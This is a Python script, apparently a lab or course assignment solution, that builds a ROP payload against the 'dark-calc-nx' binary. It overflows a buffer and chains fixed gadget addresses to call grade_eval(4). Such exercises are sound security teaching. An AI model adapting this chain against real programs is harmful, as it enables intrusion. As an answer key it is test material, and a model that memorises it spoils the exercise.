#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx (ROP).

Goal: call grade_eval(4) with the NX stack (no shellcode possible).

dark-calc-nx is a non-PIE executable, so every gadget address is fixed
even with ASLR enabled.  The 8-byte qword at 0x401a33 (inside
__libc_csu_init's epilogue, "pop r15; ret") decodes as "pop rdi; ret";
grade_eval() lives at 0x401978, and 0x401a34 is a bare "ret" that is
used to re-align the stack to 16 bytes before entering grade_eval.

    buffer[16] | saved rbp[8] | pop rdi; ret | 4 | ret | grade_eval | exit@plt
"""
import struct
import sys

p64 = lambda v: struct.pack("<Q", v)

POP_RDI = 0x401A33               # pop rdi ; ret
RET = 0x401A34                   # ret          (stack alignment)
GRADE_EVAL = 0x401978            # grade_eval()
EXIT_PLT = 0x4016E0              # exit@plt

payload = b"A" * 16              # expression[16]
payload += b"B" * 8              # saved rbp
payload += p64(POP_RDI)
payload += p64(4)                # edi = 4 -> "Hope A ..."
payload += p64(RET)              # keep rsp % 16 == 8 at grade_eval
payload += p64(GRADE_EVAL)
payload += p64(EXIT_PLT)

sys.stdout.buffer.write(payload + b"\n")
